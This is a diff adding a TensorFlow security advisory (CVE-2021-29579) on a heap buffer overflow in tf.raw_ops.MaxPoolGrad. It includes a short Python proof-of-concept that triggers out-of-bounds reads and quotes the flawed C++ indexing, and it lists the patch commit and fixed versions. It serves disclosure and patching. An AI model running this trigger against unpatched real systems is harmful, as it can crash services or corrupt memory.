@@ -1,0 +1,44 @@
+<h2>TFSA-2021-068: Heap buffer overflow in <code>MaxPoolGrad</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2021-29579</p>
+<h3>Impact</h3>
+<p>The implementation of <code>tf.raw_ops.MaxPoolGrad</code> is vulnerable to a heap buffer
+overflow:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>orig_input = tf.constant([0.0], shape=[1, 1, 1, 1], dtype=tf.float32)
+orig_output = tf.constant([0.0], shape=[1, 1, 1, 1], dtype=tf.float32)
+grad = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)
+ksize = [1, 1, 1, 1]
+strides = [1, 1, 1, 1]
+padding = "SAME"</p>
+<p>tf.raw_ops.MaxPoolGrad(
+  orig_input=orig_input, orig_output=orig_output, grad=grad, ksize=ksize,
+  strides=strides, padding=padding, explicit_paddings=[])
+```</p>
+<p>The
+<a href="https://github.com/tensorflow/tensorflow/blob/ab1e644b48c82cb71493f4362b4dd38f4577a1cf/tensorflow/core/kernels/maxpooling_op.cc#L194-L203">implementation</a>
+fails to validate that indices used to access elements of input/output arrays
+are valid:</p>
+<p><code>cc
+for (int index = out_start; index &lt; out_end; ++index) {
+  int input_backprop_index = out_arg_max_flat(index);
+  FastBoundsCheck(input_backprop_index - in_start, in_end - in_start);
+  input_backprop_flat(input_backprop_index) += out_backprop_flat(index);
+}</code></p>
+<p>Whereas accesses to <code>input_backprop_flat</code> are guarded by <code>FastBoundsCheck</code>, the
+indexing in <code>out_backprop_flat</code> can result in OOB access.</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit
+<a href="https://github.com/tensorflow/tensorflow/commit/a74768f8e4efbda4def9f16ee7e13cf3922ac5f7">a74768f8e4efbda4def9f16ee7e13cf3922ac5f7</a>.</p>
+<p>The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
+commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
+2.1.4, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security
+guide</a> for
+more information regarding the security model and how to contact us with issues
+and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu
+X-Team.</p>
